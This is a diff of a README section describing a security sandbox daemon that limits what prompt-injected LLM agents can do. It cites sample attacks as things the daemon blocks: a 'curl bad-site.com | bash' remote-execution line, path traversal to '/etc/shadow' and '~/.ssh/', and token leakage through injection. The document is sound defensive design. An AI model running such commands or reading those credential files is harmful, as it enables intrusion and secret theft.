@@ -73,11 +73,12 @@ ToolRecall sits at the exact "neck of the hourglass"—the narrow IPC layer betw
 ---
 ## Architecture & Security (The "Armor")
 
-ToolRecall is not just a cache; it is a **Security Sandbox (WAF)** for LLM agents to mitigate Prompt Injections.
+ToolRecall is not just a cache; it is a **Security Sandbox (WAF)** designed for Zero-Trust AI deployments. It doesn't cure an LLM of being prompt-injected, but it physically cages the agent to neutralize the *consequences* of a successful injection.
 
-1. **Daemon-Based (IPC):** ToolRecall runs as a persistent daemon. Agents communicate with it via Unix Domain Sockets (`/run/user/1004/toolrecall.sock`). There are no open TCP ports (immune to SSRF and port scanning).
-2. **Hard Allowlist:** Instead of trusting the LLM's system prompt to "not read passwords," ToolRecall enforces a hard Python-level allowlist (e.g., `["~/projects", "~/.hermes"]`). If a prompt injection tricks the agent into reading `~/.ssh/id_rsa`, the middleware blocks it with `Access Denied` before the file is ever touched.
-3. **Terminal Gating:** By default, `allow_terminal = false`. Read-operations are allowed, but shell commands are filtered unless explicitly whitelisted by the developer.
+1. **Daemon-Based (IPC):** ToolRecall runs as a persistent daemon. Agents communicate with it via Unix Domain Sockets (`/run/user/1000/toolrecall.sock`). There are no open TCP ports (immune to SSRF and port scanning).
+2. **Cryptographic Path Resolution (Directory Traversal Drop):** Instead of trusting the LLM's system prompt, ToolRecall enforces a hard Python-level allowlist via `os.path.realpath`. If a prompt injection tricks the agent into reading `../../../etc/shadow` or `~/.ssh/`, the daemon resolves the path and drops the request with `Access Denied` before the OS is touched.
+3. **Execution Blackholes:** By default, `allow_terminal = false`. If an injection attempts Remote Code Execution (RCE) via `curl bad-site.com | bash`, the daemon drops the payload into a black hole.
+4. **Air-Gapped API Secrets:** Standard agents load API keys into their environment variables, making them vulnerable to leaking. ToolRecall manages MCP servers internally—the daemon authenticates with external APIs using `~/.toolrecall/.env`. **The LLM never sees the actual tokens**, making it impossible to leak them during a prompt injection attack.
 
 ---
 
